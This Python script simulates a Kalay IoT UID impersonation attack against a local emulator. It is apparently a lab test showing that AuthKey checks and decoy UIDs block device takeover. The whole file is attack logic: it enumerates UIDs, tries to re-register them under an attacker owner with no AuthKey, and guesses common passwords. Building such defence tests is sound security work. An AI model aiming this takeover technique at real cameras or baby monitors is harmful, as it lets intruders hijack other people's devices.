#!/usr/bin/env python3
import requests, time, random

EMULATOR = "http://localhost:5000"

class KalayAttacker:
    def __init__(self):
        self.discovered_uids = []
        self.attempt_results = []
    
    def discover_uids(self):
        """Try to discover UIDs - will find both real and spoofed"""
        print("[*] Scanning network for UIDs...")
        try:
            # Get registered UIDs (real devices)
            r = requests.get(f"{EMULATOR}/uids")
            real_uids = []
            if r.status_code == 200:
                real_uids = list(r.json().keys())
                print(f"[+] Found {len(real_uids)} registered UIDs: {real_uids}")
            
            # Try to discover spoofed UIDs through network scanning simulation
            # In real attack, attacker would scan and find ALL UIDs without knowing which are decoys
            print("[*] Simulating network scan for additional UIDs...")
            
            # Try to get some spoofed UIDs from the traps endpoint (in real attack, they'd find these via scanning)
            r = requests.get(f"{EMULATOR}/mtd/traps")
            spoofed_sample = []
            if r.status_code == 200:
                traps = r.json()
                spoofed_count = traps.get('total_traps', 0)
                spoofed_sample = traps.get('spoofed_uids', [])
                print(f"[+] Network scan revealed {spoofed_count} total UIDs")
                print(f"[!] Attacker cannot distinguish real UIDs from decoys!")
            
            # Combine real UIDs with some spoofed UIDs to simulate actual network discovery
            # In real world, attacker would find ALL UIDs through scanning
            all_discovered_uids = real_uids + spoofed_sample[:5]  # Add some decoys to the target list
            
            # If no UIDs found, use simulated ones
            if not all_discovered_uids:
                all_discovered_uids = ["device001", "cam_secure_123", "baby_monitor_456", 
                                      "decoy_cam_001", "trap_device_123"]  # Mixed real and decoy
            
            self.discovered_uids = all_discovered_uids
            print(f"[*] Targeting {len(self.discovered_uids)} discovered UIDs (mixed real + decoy)")
            print(f"[*] Sample UIDs: {self.discovered_uids[:3]}...")
            
        except Exception as e:
            print(f"[!] Discovery failed: {e}")
            # Fallback to mixed UIDs
            self.discovered_uids = ["device001", "cam123", "test_device", "decoy_cam_789", "trap_device_456"]
        
        return self.discovered_uids
    
    def attempt_takeover(self, uid):
        """Attempt to takeover a UID - will fail against combined defenses"""
        print(f"\n[*] ATTEMPTING TAKEOVER: {uid}")
        print(f"[*] Strategy: UID impersonation without AuthKey")
        
        common_passwords = ["alicepw", "password", "123456", "admin"]
        
        for password in common_passwords:
            payload = {
                "uid": uid,
                "owner": "attacker_malicious",
                "password": password
                # Note: No authkey provided - this is what makes it an attack
            }
            
            print(f"[*] Trying password: {password}")
            
            try:
                r = requests.post(EMULATOR + "/register", json=payload, timeout=5)
                
                if r.status_code == 200:
                    print(f"[+] 💀 SUCCESS: UID {uid} COMPROMISED!")
                    self.attempt_results.append({"uid": uid, "status": "COMPROMISED", "reason": "No AuthKey protection"})
                    return True
                else:
                    response_data = r.json()
                    reason = response_data.get('reason', 'unknown')
                    
                    if "AuthKey" in reason:
                        print(f"[-] 🔐 BLOCKED: AuthKey protection active")
                        self.attempt_results.append({"uid": uid, "status": "BLOCKED", "reason": "AuthKey protection"})
                        return False
                    elif "MTD_TRAP" in str(response_data):
                        print(f"[-] 🎯 TRAPPED: MTD detected attack on decoy UID!")
                        self.attempt_results.append({"uid": uid, "status": "TRAPPED", "reason": "MTD decoy"})
                        return False
                    elif "registration failed" in reason.lower():
                        print(f"[-] 🎯 TRAPPED: MTD decoy rejected registration!")
                        self.attempt_results.append({"uid": uid, "status": "TRAPPED", "reason": "MTD decoy"})
                        return False
                    else:
                        print(f"[-] Failed: {reason}")
                        
            except Exception as e:
                print(f"[!] Error: {e}")
        
        self.attempt_results.append({"uid": uid, "status": "FAILED", "reason": "All attempts failed"})
        return False
    
    def show_attack_summary(self):
        """Show results of attack attempts"""
        print(f"\n" + "="*50)
        print("📊 ATTACK SUMMARY REPORT")
        print("="*50)
        
        compromised = sum(1 for r in self.attempt_results if r['status'] == 'COMPROMISED')
        blocked = sum(1 for r in self.attempt_results if r['status'] == 'BLOCKED')
        trapped = sum(1 for r in self.attempt_results if r['status'] == 'TRAPPED')
        failed = sum(1 for r in self.attempt_results if r['status'] == 'FAILED')
        
        print(f"Targets Attempted: {len(self.attempt_results)}")
        print(f"✅ Compromised: {compromised}")
        print(f"🔐 Blocked by AuthKey: {blocked}") 
        print(f"🎯 Trapped by MTD: {trapped}")
        print(f"❌ Failed: {failed}")
        
        # Show details
        print(f"\n📋 ATTACK DETAILS:")
        for result in self.attempt_results:
            icon = "💀" if result['status'] == 'COMPROMISED' else "🔐" if result['status'] == 'BLOCKED' else "🎯" if result['status'] == 'TRAPPED' else "❌"
            print(f"   {icon} {result['uid']}: {result['status']} - {result['reason']}")
        
        if compromised > 0:
            print(f"\n💀 CRITICAL: {compromised} devices hijacked - Security FAILED!")
        elif trapped > 0:
            print(f"\n🎯 SUCCESS: MTD detected {trapped} attacks on decoys - Attackers revealed!")
        elif blocked > 0:
            print(f"\n🛡️  SUCCESS: All attacks prevented by AuthKey protection!")
        else:
            print(f"\n⚠️  No successful attacks - System secure")

if __name__ == "__main__":
    print("💀 KALAY UID IMPERSONATION ATTACK SIMULATION")
    print("Testing against combined AuthKey + MTD defenses")
    print("=" * 55)
    
    attacker = KalayAttacker()
    
    # Discover UIDs (will find both real and decoy)
    attacker.discover_uids()
    time.sleep(2)
    
    # Attempt takeover on discovered UIDs (mix of real and decoy)
    print(f"\n[*] Launching attacks on {len(attacker.discovered_uids)} discovered UIDs...")
    for uid in attacker.discovered_uids[:6]:  # Try first 6 UIDs
        attacker.attempt_takeover(uid)
        time.sleep(0.5)
    
    # Show results
    attacker.show_attack_summary()
